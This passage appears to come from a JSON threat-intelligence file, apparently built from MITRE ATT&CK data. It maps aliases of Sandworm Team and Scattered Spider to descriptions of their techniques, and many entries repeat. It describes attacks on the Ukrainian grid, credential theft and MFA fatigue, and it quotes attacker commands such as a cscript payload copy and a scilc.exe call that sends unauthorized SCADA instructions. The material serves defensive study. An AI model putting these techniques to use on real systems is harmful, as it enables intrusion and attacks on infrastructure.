Electric Power Attack, Sandworm Team gathered account credentials via a BlackEnergy keylogger plugin. , Sandworm Team has used move to transfer files to a network share and has copied payloads--such as Prestige ransomware--to an Active Directory Domain Controller and distributed via the Default Domain Group Policy Object. Additionally, Sandworm Team has transferred an ISO file into the OT network to gain initial access.During the 2015 Ukraine Electric Power Attack, Sandworm Team moved their tools laterally within the corporate network and between the ICS and corporate network. During the 2016 Ukraine Electric Power Attack, Sandworm Team used move to transfer files to a network share.During the 2022 Ukraine Electric Power Attack, Sandworm Team used a Group Policy Object (GPO) to copy CaddyWiper's executable msserver.exe from a staging server to a local hard drive before deployment., During the 2015 Ukraine Electric Power Attack, Sandworm Team moved their tools laterally within the corporate network and between the ICS and corporate network. , During the 2016 Ukraine Electric Power Attack, Sandworm Team used move to transfer files to a network share., During the 2022 Ukraine Electric Power Attack, Sandworm Team used a Group Policy Object (GPO) to copy CaddyWiper's executable msserver.exe from a staging server to a local hard drive before deployment.",
    "Voodoo Bear": " During the 2015 Ukraine Electric Power Attack, Sandworm Team gathered account credentials via a BlackEnergy keylogger plugin. , Sandworm Team has used move to transfer files to a network share and has copied payloads--such as Prestige ransomware--to an Active Directory Domain Controller and distributed via the Default Domain Group Policy Object. Additionally, Sandworm Team has transferred an ISO file into the OT network to gain initial access.During the 2015 Ukraine Electric Power Attack, Sandworm Team moved their tools laterally within the corporate network and between the ICS and corporate network. During the 2016 Ukraine Electric Power Attack, Sandworm Team used move to transfer files to a network share.During the 2022 Ukraine Electric Power Attack, Sandworm Team used a Group Policy Object (GPO) to copy CaddyWiper's executable msserver.exe from a staging server to a local hard drive before deployment., During the 2015 Ukraine Electric Power Attack, Sandworm Team moved their tools laterally within the corporate network and between the ICS and corporate network. , During the 2016 Ukraine Electric Power Attack, Sandworm Team used move to transfer files to a network share., During the 2022 Ukraine Electric Power Attack, Sandworm Team used a Group Policy Object (GPO) to copy CaddyWiper's executable msserver.exe from a staging server to a local hard drive before deployment., Sandworm Team masqueraded malicious installers as Windows update packages to evade defense and entice users to execute binaries., During the 2022 Ukraine Electric Power Attack, Sandworm Team leveraged Systemd service units to masquerade GOGETTER malware as legitimate or seemingly legitimate services., Sandworm Team has avoided detection by naming a malicious binary explorer.exe.During the 2016 Ukraine Electric Power Attack, DLLs and EXEs with filenames associated with common electric power sector protocols were used to masquerade files., During the 2016 Ukraine Electric Power Attack, DLLs and EXEs with filenames associated with common electric power sector protocols were used to masquerade files., During the 2016 Ukraine Electric Power Attack, Sandworm Team masqueraded executables as .txt files., During the 2016 Ukraine Electric Power Attack, Sandworm Team created two new accounts, 'admin' and 'система' (System)., During the 2015 Ukraine Electric Power Attack, Sandworm Team modified in-registry Internet settings to lower internet security before launching rundll32.exe, which in-turn launches the malware and communicates with C2 servers over the Internet. ., Sandworm Team uses Prestige to disable and restore file system redirection by using the following functions:  Wow64DisableWow64FsRedirection() and Wow64RevertWow64FsRedirection()., Sandworm Team has used intercepter-NG to sniff passwords in network traffic. During the 2015 Ukraine Electric Power Attack, Sandworm Team used BlackEnergy’s network sniffer module to discover user credentials being sent over the network between the local LAN and the power grid’s industrial control systems. , During the 2015 Ukraine Electric Power Attack, Sandworm Team used BlackEnergy’s network sniffer module to discover user credentials being sent over the network between the local LAN and the power grid’s industrial control systems. , During the 2022 Ukraine Electric Power Attack, Sandworm Team proxied C2 communications within a TLS-based tunnel., Sandworm Team has used port 6789 to accept connections on the group's SSH server., Sandworm Team has used Base64 encoding within malware variants.During the 2016 Ukraine Electric Power Attack, Sandworm Team used heavily obfuscated code with Industroyer in its Windows Notepad backdoor., During the 2016 Ukraine Electric Power Attack, Sandworm Team used heavily obfuscated code with Industroyer in its Windows Notepad backdoor., During the 2016 Ukraine Electric Power Attack, Sandworm Team used UPX to pack a copy of Mimikatz., Sandworm Team has used ROT13 encoding, AES encryption and compression with the zlib library for their Python-based backdoor.",
    "IRIDIUM": " Sandworm Team has used a keylogger to capture keystrokes by using the SetWindowsHookEx function. During the 2015 Ukraine Electric Power Attack, Sandworm Team gathered account credentials via a BlackEnergy keylogger plugin. , During the 2015 Ukraine Electric Power Attack, Sandworm Team gathered account credentials via a BlackEnergy keylogger plugin. , Sandworm Team has used move to transfer files to a network share and has copied payloads--such as Prestige ransomware--to an Active Directory Domain Controller and distributed via the Default Domain Group Policy Object. Additionally, Sandworm Team has transferred an ISO file into the OT network to gain initial access.During the 2015 Ukraine Electric Power Attack, Sandworm Team moved their tools laterally within the corporate network and between the ICS and corporate network. During the 2016 Ukraine Electric Power Attack, Sandworm Team used move to transfer files to a network share.During the 2022 Ukraine Electric Power Attack, Sandworm Team used a Group Policy Object (GPO) to copy CaddyWiper's executable msserver.exe from a staging server to a local hard drive before deployment., During the 2015 Ukraine Electric Power Attack, Sandworm Team moved their tools laterally within the corporate network and between the ICS and corporate network. , During the 2016 Ukraine Electric Power Attack, Sandworm Team used move to transfer files to a network share., During the 2022 Ukraine Electric Power Attack, Sandworm Team used a Group Policy Object (GPO) to copy CaddyWiper's executable msserver.exe from a staging server to a local hard drive before deployment., Sandworm Team masqueraded malicious installers as Windows update packages to evade defense and entice users to execute binaries., During the 2022 Ukraine Electric Power Attack, Sandworm Team leveraged Systemd service units to masquerade GOGETTER malware as legitimate or seemingly legitimate services., Sandworm Team has avoided detection by naming a malicious binary explorer.exe.During the 2016 Ukraine Electric Power Attack, DLLs and EXEs with filenames associated with common electric power sector protocols were used to masquerade files., During the 2016 Ukraine Electric Power Attack, DLLs and EXEs with filenames associated with common electric power sector protocols were used to masquerade files., During the 2016 Ukraine Electric Power Attack, Sandworm Team masqueraded executables as .txt files., During the 2016 Ukraine Electric Power Attack, Sandworm Team created two new accounts, 'admin' and 'система' (System)., During the 2015 Ukraine Electric Power Attack, Sandworm Team modified in-registry Internet settings to lower internet security before launching rundll32.exe, which in-turn launches the malware and communicates with C2 servers over the Internet. ., Sandworm Team uses Prestige to disable and restore file system redirection by using the following functions:  Wow64DisableWow64FsRedirection() and Wow64RevertWow64FsRedirection()., Sandworm Team has used intercepter-NG to sniff passwords in network traffic. During the 2015 Ukraine Electric Power Attack, Sandworm Team used BlackEnergy’s network sniffer module to discover user credentials being sent over the network between the local LAN and the power grid’s industrial control systems. , During the 2015 Ukraine Electric Power Attack, Sandworm Team used BlackEnergy’s network sniffer module to discover user credentials being sent over the network between the local LAN and the power grid’s industrial control systems. , During the 2022 Ukraine Electric Power Attack, Sandworm Team proxied C2 communications within a TLS-based tunnel., Sandworm Team has used port 6789 to accept connections on the group's SSH server., Sandworm Team has used Base64 encoding within malware variants.During the 2016 Ukraine Electric Power Attack, Sandworm Team used heavily obfuscated code with Industroyer in its Windows Notepad backdoor., During the 2016 Ukraine Electric Power Attack, Sandworm Team used heavily obfuscated code with Industroyer in its Windows Notepad backdoor.",
    "Seashell Blizzard": "Sandworm Team has used Empire, Cobalt Strike and PoshC2., In 2017, Sandworm Team conducted technical research related to vulnerabilities associated with websites used by the Korean Sport and Olympic Committee, a Korean power company, and a Korean airport., Sandworm Team has used its plainpwd tool, a modified version of Mimikatz, and comsvcs.dll to dump Windows credentials from system memory. During the 2016 Ukraine Electric Power Attack, Sandworm Team used Mimikatz to capture and use legitimate credentials., During the 2016 Ukraine Electric Power Attack, Sandworm Team used Mimikatz to capture and use legitimate credentials., Sandworm Team has used ntdsutil.exe to back up the Active Directory database, likely for credential access., Sandworm Team has delivered malicious Microsoft Office and ZIP file attachments via spearphishing emails.During the 2015 Ukraine Electric Power Attack, Sandworm Team obtained their initial foothold into many IT systems using Microsoft Office attachments delivered through phishing emails. , During the 2015 Ukraine Electric Power Attack, Sandworm Team obtained their initial foothold into many IT systems using Microsoft Office attachments delivered through phishing emails. , Sandworm Team has crafted phishing emails containing malicious hyperlinks., Sandworm Team has crafted spearphishing emails with hyperlinks designed to trick unwitting recipients into revealing their account credentials., During the 2015 Ukraine Electric Power Attack, Sandworm Team loaded BlackEnergy into svchost.exe, which then launched iexplore.exe for their C2. , During the 2022 Ukraine Electric Power Attack, Sandworm Team deployed the GOGETTER tunneler software to establish a 'Yamux' TLS-based C2 channel with an external server(s)., Sandworm Team's BCS-server tool can create an internal proxy server to redirect traffic from the adversary-controlled C2 to internal servers which may not be connected to the internet, but are interconnected locally. , Sandworm Team has used remote administration tools or remote industrial control system client software for execution and to maliciously release electricity breakers., Sandworm Team has copied payloads to the ADMIN$ share of remote systems and run net use to connect to network shares.During the 2016 Ukraine Electric Power Attack, Sandworm Team utilized net use to connect to network shares., During the 2016 Ukraine Electric Power Attack, Sandworm Team utilized net use to connect to network shares., Sandworm Team has used a tool to query Active Directory using LDAP, discovering information about computers listed in AD. During the 2015 Ukraine Electric Power Attack, Sandworm Team remotely discovered systems over LAN connections. OT systems were visible from the IT network   as well, giving adversaries the ability to discover operational assets. During the 2016 Ukraine Electric Power Attack, Sandworm Team checked for connectivity to resources within the network and used LDAP to query Active Directory, discovering information about computers listed in AD., During the 2015 Ukraine Electric Power Attack, Sandworm Team remotely discovered systems over LAN connections. OT systems were visible from the IT network   as well, giving adversaries the ability to discover operational assets. , During the 2016 Ukraine Electric Power Attack, Sandworm Team checked for connectivity to resources within the network and used LDAP to query Active Directory, discovering information about computers listed in AD., Sandworm Team leveraged SHARPIVORY, a .NET dropper that writes embedded payload to disk and uses scheduled tasks to persist on victim machines.During the 2022 Ukraine Electric Power Attack, Sandworm Team leveraged Scheduled Tasks through a Group Policy Object (GPO) to execute CaddyWiper at a predetermined time., During the 2022 Ukraine Electric Power Attack, Sandworm Team leveraged Scheduled Tasks through a Group Policy Object (GPO) to execute CaddyWiper at a predetermined time., Sandworm Team researched Ukraine's unique legal entity identifier (called an 'EDRPOU' number), including running queries on the EDRPOU website, in preparation for the NotPetya attack. Sandworm Team has also researched third-party websites to help it craft credible spearphishing emails., Sandworm Team has conducted research against potential victim websites as part of its operational planning.",
    "FROZENBARENTS": "Sandworm Team used information stealer malware to collect browser session cookies., Sandworm Team staged compromised versions of legitimate software installers on forums to achieve initial, untargetetd access in victim environments. , Sandworm Team has distributed NotPetya by compromising the legitimate Ukrainian accounting software M.E.Doc and replacing a legitimate software update with a malicious one., Sandworm Team used a backdoor which could execute a supplied DLL using rundll32.exe. During the 2015 Ukraine Electric Power Attack, Sandworm Team used a backdoor which could execute a supplied DLL using rundll32.exe. , During the 2015 Ukraine Electric Power Attack, Sandworm Team used a backdoor which could execute a supplied DLL using rundll32.exe. , Sandworm Team used a backdoor to enumerate information about the infected system's operating system. , Sandworm Team had gathered user, IP address, and server data related to RDP sessions on a compromised host. It has also accessed network diagram files useful for understanding how a host's network was configured. , Sandworm Team has collected the username from a compromised host., Sandworm Team has used dedicated network connections from one victim organization to gain unauthorized access to a separate organization. Additionally, Sandworm Team has accessed Internet service providers and telecommunication entities that provide mobile connectivity. , Sandworm Team has tricked unwitting recipients into clicking on malicious hyperlinks within emails crafted to resemble trustworthy senders., Sandworm Team has tricked unwitting recipients into clicking on spearphishing attachments and enabling malicious macros embedded within files.During the 2015 Ukraine Electric Power Attack, Sandworm Team leveraged Microsoft Office attachments which contained malicious macros that were automatically executed once the user permitted them. , During the 2015 Ukraine Electric Power Attack, Sandworm Team leveraged Microsoft Office attachments which contained malicious macros that were automatically executed once the user permitted them. , Sandworm Team have used previously acquired legitimate credentials prior to attacks.During the 2015 Ukraine Electric Power Attack, Sandworm Team used valid accounts on the corporate network to escalate privileges, move laterally, and establish persistence within the corporate network. , During the 2015 Ukraine Electric Power Attack, Sandworm Team used valid accounts on the corporate network to escalate privileges, move laterally, and establish persistence within the corporate network. , Sandworm Team has used stolen credentials to access administrative accounts within the domain., Sandworm Team has used the Telegram Bot API from Telegram Messenger to send and receive commands to its Python backdoor. Sandworm Team also used legitimate M.E.Doc software update check requests for sending and receiving commands and hosted malicious payloads on putdrive.com., Sandworm Team has used Impacket’s WMIexec module for remote code execution and VBScript to run WMI queries.During the 2016 Ukraine Electric Power Attack, WMI in scripts were used for remote execution and system surveys. , During the 2016 Ukraine Electric Power Attack, WMI in scripts were used for remote execution and system surveys. , Sandworm Team used SMS-based phishing to target victims with malicious links., Sandworm Team can collect encrypted Telegram and Signal communications., During the 2022 Ukraine Electric Power Attack, Sandworm Team used existing hypervisor access to map an ISO image named a.iso to a virtual machine running a SCADA server. The SCADA server’s operating system was configured to autorun CD-ROM images, and as a result, a malicious VBS script on the ISO image was automatically executed., During the 2015 Ukraine Electric Power Attack, Sandworm Team blocked command messages by using malicious firmware to render serial-to-ethernet converters inoperable. , During the 2015 Ukraine Electric Power Attack, Sandworm Team blocked reporting messages by using malicious firmware to render serial-to-ethernet converters inoperable.",
    "APT44": "During the 2015 Ukraine Electric Power Attack, Sandworm Team scheduled the uninterruptable power supplies (UPS) to shutdown data and telephone servers via the UPS management interface. , Sandworm Team actors exploited vulnerabilities in GE's Cimplicity HMI and Advantech/Broadwin WebAccess HMI software which had been directly exposed to the internet.  , During the 2015 Ukraine Electric Power Attack, Sandworm Team used Valid Accounts taken from the Windows Domain Controller to access the control system Virtual Private Network (VPN) used by grid operators. , During the 2015 Ukraine Electric Power Attack, Sandworm Team utilized HMI GUIs in the SCADA environment to open breakers. , During the 2015 Ukraine Electric Power Attack, Sandworm Team moved their tools laterally within the ICS network. During the 2016 Ukraine Electric Power Attack, Sandworm Team used a VBS script to facilitate lateral tool transfer. The VBS script was used to copy ICS-specific payloads with the following command: cscript C:/Backinfo/ufn.vbs C:/Backinfo/101.dll C:/Delta/101.dll, During the 2016 Ukraine Electric Power Attack, Sandworm Team used a VBS script to facilitate lateral tool transfer. The VBS script was used to copy ICS-specific payloads with the following command: cscript C:/Backinfo/ufn.vbs C:/Backinfo/101.dll C:/Delta/101.dll, During the 2015 Ukraine Electric Power Attack, Sandworm Team opened the breakers at the infected sites, shutting the power off for thousands of businesses and households for around 6 hours. , During the 2015 Ukraine Electric Power Attack, operators were shut out of their equipment either through the denial of peripheral use or the degradation of equipment. Operators were therefore unable to recover from the incident through their traditional means. Much of the power was restored manually. , During the 2015 Ukraine Electric Power Attack, power breakers were opened which caused the operating companies to be unable to deliver power, and left thousands of businesses and households without power for around 6 hours. , During the 2015 Ukraine Electric Power Attack, Sandworm Team opened live breakers via remote commands to the HMI, causing blackouts. , During the 2016 Ukraine Electric Power Attack, Sandworm Team transferred executable files as .txt and then renamed them to .exe, likely to avoid detection through extension tracking., During the 2015 Ukraine Electric Power Attack, Sandworm Team used an IT helpdesk software to move the mouse on ICS control devices to maliciously release electricity breakers. During the 2016 Ukraine Electric Power Attack, Sandworm Team used MS-SQL access to a pivot machine, allowing code execution throughout the ICS network., During the 2016 Ukraine Electric Power Attack, Sandworm Team used MS-SQL access to a pivot machine, allowing code execution throughout the ICS network., During the 2015 Ukraine Electric Power Attack, Sandworm Team remotely discovered operational assets once on the OT network.  , During the 2016 Ukraine Electric Power Attack, Sandworm Team utilized VBS and batch scripts for file movement and as wrappers for PowerShell execution.During the 2022 Ukraine Electric Power Attack, Sandworm Team utilizes a Visual Basic script lun.vbs to execute n.bat which then executed the MicroSCADA scilc.exe command., During the 2022 Ukraine Electric Power Attack, Sandworm Team utilizes a Visual Basic script lun.vbs to execute n.bat which then executed the MicroSCADA scilc.exe command., During the 2022 Ukraine Electric Power Attack, Sandworm Team executed a MicroSCADA application binary scilc.exe to send a predefined list of SCADA instructions specified in a file defined by the adversary, s1.txt. The executed command C:/sc/prog/exec/scilc.exe -do pack/scil/s1.txt leverages the SCADA software to send unauthorized command messages to remote substations., During the 2015 Ukraine Electric Power Attack, Sandworm Team overwrote the serial-to-ethernet gateways with custom firmware to make systems either disabled, shutdown, and/or unrecoverable. , During the 2015 Ukraine Electric Power Attack, Sandworm Team issued unauthorized commands to substation breaks after gaining control of operator workstations and accessing a distribution management system (DMS) application. During the 2022 Ukraine Electric Power Attack, Sandworm Team used the MicroSCADA SCIL-API to specify a set of SCADA instructions, including the sending of unauthorized commands to substation devices., During the 2022 Ukraine Electric Power Attack, Sandworm Team used the MicroSCADA SCIL-API to specify a set of SCADA instructions, including the sending of unauthorized commands to substation devices., During the 2015 Ukraine Electric Power Attack, Sandworm Team used valid accounts to laterally move through VPN connections and dual-homed systems. Sandworm Team used the credentials of valid accounts to interact with client applications and access employee workstations hosting HMI applications.  During the 2016 Ukraine Electric Power Attack, Sandworm Team used valid accounts to laterally move through VPN connections and dual-homed systems., During the 2016 Ukraine Electric Power Attack, Sandworm Team used valid accounts to laterally move through VPN connections and dual-homed systems.",
    "Scarlet Mimic": "Scarlet Mimic is a threat group that has targeted minority rights activists. This group has not been directly linked to a government source, but the group's motivations appear to overlap with those of the Chinese government. While there is some overlap between IP addresses used by Scarlet Mimic and Putter Panda, it has not been concluded that the groups are the same. , Scarlet Mimic has used the left-to-right override character in self-extracting RAR archive spearphishing attachment file names.",
    "Scattered Spider": "Scattered Spider is a native English-speaking cybercriminal group that has been active since at least 2022. The group initially targeted customer relationship management and business-process outsourcing (BPO) firms as well as telecommunications and technology companies. Beginning in 2023, Scattered Spider expanded its operations to compromise victims in the gaming, hospitality, retail, MSP, manufacturing, and financial sectors. During campaigns, Scattered Spider has leveraged targeted social-engineering techniques, attempted to bypass popular endpoint security tools, and more recently, deployed ransomware for financial gain., , , , , Scattered Spider leverages legitimate domain accounts to gain access to the target environment., During C0027, Scattered Spider accessed Azure AD to identify email addresses., During C0027, Scattered Spider accessed Azure AD to download bulk lists of group members and to identify privileged users, along with the email addresses and AD attributes., During C0027, Scattered Spider used aws_consoler  to create temporary federated credentials for fake users in order to obfuscate which AWS credential is compromised and enable pivoting from the AWS CLI to console sessions without MFA., During C0027, Scattered Spider used IAM manipulation to gain persistence and to assume or elevate privileges., Scattered Spider has also assigned user access admin roles in order to gain Tenant Root Group management permissions in Azure.During C0027, Scattered Spider used IAM manipulation to gain persistence and to assume or elevate privileges., During C0027, Scattered Spider used IAM manipulation to gain persistence and to assume or elevate privileges., During C0027, Scattered Spider registered devices for MFA to maintain persistence through victims' VPN., Scattered Spider retrieves browser histories via infostealer malware such as Raccoon Stealer., Scattered Spider enumerates cloud environments to identify server and backup management infrastructure, resource access, databases and storage containers., Scattered Spider abused AWS Systems Manager Inventory to identify targets on the compromised network prior to lateral movement., Scattered Spider creates new user identities within the compromised organization., Scattered Spider has used BlackCat ransomware to encrypt files on VMWare ESXi servers., Scattered Spider enumerates data stored in cloud resources for collection and exfiltration purposes.During C0027, Scattered Spider accessed victim OneDrive environments to search for VPN and MFA enrollment information, help desk instructions, and new hire guides., During C0027, Scattered Spider accessed victim OneDrive environments to search for VPN and MFA enrollment information, help desk instructions, and new hire guides., During C0027, Scattered Spider accessed victim SharePoint environments to search for VPN and MFA enrollment information, help desk instructions, and new hire guides., Scattered Spider enumerates data stored within victim code repositories, such as internal GitHub repositories., Scattered Spider threat actors search the victim’s Slack and Microsoft Teams for conversations about the intrusion and incident response., Scattered Spider stages data in a centralized database prior to exfiltration., Scattered Spider has created volume shadow copies of virtual domain controller disks to extract the NTDS.dit file., Scattered Spider adds a federated identity provider to the victim’s SSO tenant and activates automatic account linking., Scattered Spider threat actors search the victim’s Microsoft Exchange for emails about the intrusion and incident response., Scattered Spider has exfiltrated victim data to the MEGA file sharing site., During C0027, Scattered Spider exploited CVE-2021-35464 in the ForgeRock Open Access Management (OpenAM) application server to gain initial access., Scattered Spider has deployed a malicious kernel driver through exploitation of CVE-2015-2291 in the Intel Ethernet diagnostics driver for Windows (iqvw64.sys)., Scattered Spider has leveraged legitimate remote management tools to maintain persistent access.During C0027, Scattered Spider used Citrix and VPNs to persist in compromised environments., During C0027, Scattered Spider used Citrix and VPNs to persist in compromised environments., Scattered Spider Spider enumerates a target organization for files and directories of interest, including source code., Scattered Spider has deployed ransomware on compromised hosts for financial gain., During C0027, Scattered Spider sent phishing messages via SMS to steal credentials., Scattered Spider creates inbound rules on the compromised email accounts of security personnel to automatically delete emails from vendor security products., During C0027, Scattered Spider impersonated legitimate IT personnel in phone calls and text messages either to direct victims to a credential harvesting site or getting victims to run commercial remote monitoring and management (RMM) tools., Scattered Spider utilized social engineering to compel IT help desk personnel to reset passwords and MFA tokens.During C0027, Scattered Spider impersonated legitimate IT personnel in phone calls and text messages either to direct victims to a credential harvesting site or getting victims to run commercial remote monitoring and management (RMM) tools., During C0027, Scattered Spider impersonated legitimate IT personnel in phone calls and text messages either to direct victims to a credential harvesting site or getting victims to run commercial remote monitoring and management (RMM) tools., During C0027, Scattered Spider downloaded tools using victim organization systems., After compromising user accounts, Scattered Spider registers their own MFA tokens., Scattered Spider has added additional trusted locations to Azure AD conditional access policies. , During C0027, Scattered Spider used access to the victim's Azure tenant to create Azure VMs., Scattered Spider has also created Amazon EC2 instances within the victim's environment.During C0027, Scattered Spider used access to the victim's Azure tenant to create Azure VMs., During C0027, Scattered Spider used access to the victim's Azure tenant to create Azure VMs., Scattered Spider has used multifactor authentication (MFA) fatigue by sending repeated MFA authentication requests to targets.During C0027, Scattered Spider attempted to gain access by continuously sending MFA messages to the victim until they accept the MFA push challenge., During C0027, Scattered Spider attempted to gain access by continuously sending MFA messages to the victim until they accept the MFA push challenge., During C0027, used RustScan to scan for open ports on targeted ESXi appliances., During C0027, Scattered Spider obtained and used multiple tools including the LINpeas privilege escalation utility, aws_consoler, rsocx reverse proxy, Level RMM tool, and RustScan port scanner., Scattered Spider has extracted the NTDS.dit file by creating volume shadow copies of virtual domain controller disks., During C0027, Scattered Spider performed domain replication., During C0027, Scattered Spider accessed Azure AD to download bulk lists of group members and their Active Directory attributes., During C0027, Scattered Spider impersonated legitimate IT personnel in phone calls to direct victims to download a remote monitoring and management (RMM) tool that would allow the adversary to remotely control their system., Scattered Spider has used a combination of credential phishing and social engineering to capture one-time-password (OTP) codes., During C0027, Scattered Spider sent Telegram messages impersonating IT personnel to harvest credentials., During C0027, Scattered Spider used phone calls to instruct victims to navigate to credential-harvesting websites., Scattered Spider has also called employees at target organizations and compelled them to navigate to fake login portals using adversary-in-the-middle toolkits.During C0027, Scattered Spider used phone calls to instruct victims to navigate to credential-harvesting websites., During C0027, Scattered Spider used phone calls to instruct victims to navigate to credential-harvesting websites., During C0027, Scattered Spider used SSH tunneling in targeted environments., During C0027, Scattered Spider installed the open-source rsocx reverse proxy tool on a targeted ESXi appliance., During C0027, Scattered Spider directed victims to run remote monitoring and management (RMM) tools., In addition to directing victims to run remote software, Scattered Spider members themselves also deploy RMM software including AnyDesk, LogMeIn, and ConnectWise Control to establish persistence on the compromised network.During C0027, Scattered Spider directed victims to run remote monitoring and management (RMM) tools., During C0027, Scattered Spider directed victims to run remote monitoring and management (RMM) tools., During C0027, Scattered Spider used compromised Azure credentials for credential theft activity and lateral movement to on-premises systems., Scattered Spider has also leveraged pre-existing AWS EC2 instances for lateral movement and data collection purposes.During C0027, Scattered Spider used compromised Azure credentials for credential theft activity and lateral movement to on-premises systems., During C0027, Scattered Spider used compromised Azure credentials for credential theft activity and lateral movement to on-premises systems., Scattered Spider can enumerate remote systems, such as VMware vCenter infrastructure., Scattered Spider retrieves browser cookies via Raccoon Stealer., Scattered Spider has used self-signed and stolen certificates originally issued to NVIDIA and Global Software LLC., Scattered Spider Spider searches for credential storage documentation on a compromised host., Scattered Spider enumerate and exfiltrate code-signing certificates from a compromised host., Scattered Spider has impersonated organization IT and helpdesk staff to instruct victims to execute commercial remote access tools to gain initial access., During C0027, Scattered Spider leveraged compromised credentials from victim users  to authenticate to Azure tenants., During C0027, Scattered Spider downloaded tools from sites including file.io, GitHub, and paste.ee., During C0027, Scattered Spider used Windows Management Instrumentation (WMI) to move laterally via Impacket., Scattered Spider has sent SMS phishing messages to employee phone numbers with a link to a site configured with a fake credential harvesting login portal.",
    "Roasted 0ktapus": "Scattered Spider leverages legitimate domain accounts to gain access to the target environment., During C0027, Scattered Spider accessed Azure AD to identify email addresses., During C0027, Scattered Spider accessed Azure AD to download bulk lists of group members and to identify privileged users, along with the email addresses and AD attributes., During C0027, Scattered Spider used aws_consoler  to create temporary federated credentials for fake users in order to obfuscate which AWS credential is compromised and enable pivoting from the AWS CLI to console sessions without MFA., During C0027, Scattered Spider used IAM manipulation to gain persistence and to assume or elevate privileges., Scattered Spider has also assigned user access admin roles in order to gain Tenant Root Group management permissions in Azure.During C0027, Scattered Spider used IAM manipulation to gain persistence and to assume or elevate privileges., During C0027, Scattered Spider used IAM manipulation to gain persistence and to assume or elevate privileges., During C0027, Scattered Spider registered devices for MFA to maintain persistence through victims' VPN., Scattered Spider retrieves browser histories via infostealer malware such as Raccoon Stealer., Scattered Spider enumerates cloud environments to identify server and backup management infrastructure, resource access, databases and storage containers., Scattered Spider abused AWS Systems Manager Inventory to identify targets on the compromised network prior to lateral movement., Scattered Spider creates new user identities within the compromised organization., Scattered Spider has used BlackCat ransomware to encrypt files on VMWare ESXi servers., Scattered Spider enumerates data stored in cloud resources for collection and exfiltration purposes.During C0027, Scattered Spider accessed victim OneDrive environments to search for VPN and MFA enrollment information, help desk instructions, and new hire guides., During C0027, Scattered Spider accessed victim OneDrive environments to search for VPN and MFA enrollment information, help desk instructions, and new hire guides., During C0027, Scattered Spider accessed victim SharePoint environments to search for VPN and MFA enrollment information, help desk instructions, and new hire guides., Scattered Spider enumerates data stored within victim code repositories, such as internal GitHub repositories., Scattered Spider threat actors search the victim’s Slack and Microsoft Teams for conversations about the intrusion and incident response.",
    "Octo Tempest": "During C0027, Scattered Spider exploited CVE-2021-35464 in the ForgeRock Open Access Management (OpenAM) application server to gain initial access., Scattered Spider has deployed a malicious kernel driver through exploitation of CVE-2015-2291 in the Intel Ethernet diagnostics driver for Windows (iqvw64.sys)., Scattered Spider has leveraged legitimate remote management tools to maintain persistent access.During C0027, Scattered Spider used Citrix and VPNs to persist in compromised environments., During C0027, Scattered Spider used Citrix and VPNs to persist in compromised environments., Scattered Spider Spider enumerates a target organization for files and directories of interest, including source code., Scattered Spider has deployed ransomware on compromised hosts for financial gain., During C0027, Scattered Spider sent phishing messages via SMS to steal credentials., Scattered Spider creates inbound rules on the compromised email accounts of security personnel to automatically delete emails from vendor security products., During C0027, Scattered Spider impersonated legitimate IT personnel in phone calls and text messages either to direct victims to a credential harvesting site or getting victims to run commercial remote monitoring and management (RMM) tools., Scattered Spider utilized social engineering to compel IT help desk personnel to reset passwords and MFA tokens.During C0027, Scattered Spider impersonated legitimate IT personnel in phone calls and text messages either to direct victims to a credential harvesting site or getting victims to run commercial remote monitoring and management (RMM) tools., During C0027, Scattered Spider impersonated legitimate IT personnel in phone calls and text messages either to direct victims to a credential harvesting site or getting victims to run commercial remote monitoring and management (RMM) tools., During C0027, Scattered Spider downloaded tools using victim organization systems., After compromising user accounts, Scattered Spider registers their own MFA tokens., Scattered Spider has added additional trusted locations to Azure AD conditional access policies. , During C0027, Scattered Spider used access to the victim's Azure tenant to create Azure VMs., Scattered Spider has also created Amazon EC2 instances within the victim's environment.During C0027, Scattered Spider used access to the victim's Azure tenant to create Azure VMs., During C0027, Scattered Spider used access to the victim's Azure tenant to create Azure VMs.",
    "Storm-0875": "During C0027, Scattered Spider used access to the victim's Azure tenant to create Azure VMs., Scattered Spider has used multifactor authentication (MFA) fatigue by sending repeated MFA authentication requests to targets.During C0027, Scattered Spider attempted to gain access by continuously sending MFA messages to the victim until they accept the MFA push challenge., During C0027, Scattered Spider attempted to gain access by continuously sending MFA messages to the victim until they accept the MFA push challenge., During C0027, used RustScan to scan for open ports on targeted ESXi appliances., During C0027, Scattered Spider obtained and used multiple tools including the LINpeas privilege escalation utility, aws_consoler, rsocx reverse proxy, Level RMM tool, and RustScan port scanner., Scattered Spider has extracted the NTDS.dit file by creating volume shadow copies of virtual domain controller disks., During C0027, Scattered Spider performed domain replication., During C0027, Scattered Spider accessed Azure AD to download bulk lists of group members and their Active Directory attributes., During C0027, Scattered Spider impersonated legitimate IT personnel in phone calls to direct victims to download a remote monitoring and management (RMM) tool that would allow the adversary to remotely control their system., Scattered Spider has used a combination of credential phishing and social engineering to capture one-time-password (OTP) codes., During C0027, Scattered Spider sent Telegram messages impersonating IT personnel to harvest credentials., During C0027, Scattered Spider used phone calls to instruct victims to navigate to credential-harvesting websites., Scattered Spider has also called employees at target organizations and compelled them to navigate to fake login portals using adversary-in-the-middle toolkits.During C0027, Scattered Spider used phone calls to instruct victims to navigate to credential-harvesting websites., During C0027, Scattered Spider used phone calls to instruct victims to navigate to credential-harvesting websites., During C0027, Scattered Spider used SSH tunneling in targeted environments., During C0027, Scattered Spider installed the open-source rsocx reverse proxy tool on a targeted ESXi appliance., During C0027, Scattered Spider directed victims to run remote monitoring and management (RMM) tools., In addition to directing victims to run remote software, Scattered Spider members themselves also deploy RMM software including AnyDesk, LogMeIn, and ConnectWise Control to establish persistence on the compromised network.During C0027, Scattered Spider directed victims to run remote monitoring and management (RMM) tools., During C0027, Scattered Spider directed victims to run remote monitoring and management (RMM) tools., During C0027, Scattered Spider used compromised Azure credentials for credential theft activity and lateral movement to on-premises systems., Scattered Spider has also leveraged pre-existing AWS EC2 instances for lateral movement and data collection purposes.During C0027, Scattered Spider used compromised Azure credentials for credential theft activity and lateral movement to on-premises systems., During C0027, Scattered Spider used compromised Azure credentials for credential theft activity and lateral movement to on-premises systems., Scattered Spider can enumerate remote systems, such as VMware vCenter infrastructure., Scattered Spider retrieves browser cookies via Raccoon Stealer., Scattered Spider has used self-signed and stolen certificates originally issued to NVIDIA and Global Software LLC., Scattered Spider Spider searches for credential storage documentation on a compromised host., Scattered Spider enumerate and exfiltrate code-signing certificates from a compromised host., Scattered Spider has impersonated organization IT and helpdesk staff to instruct victims to execute commercial remote access tools to gain initial access., During C0027, Scattered Spider leveraged compromised credentials from victim users  to authenticate to Azure tenants., During C0027, Scattered Spider downloaded tools from sites including file.io, 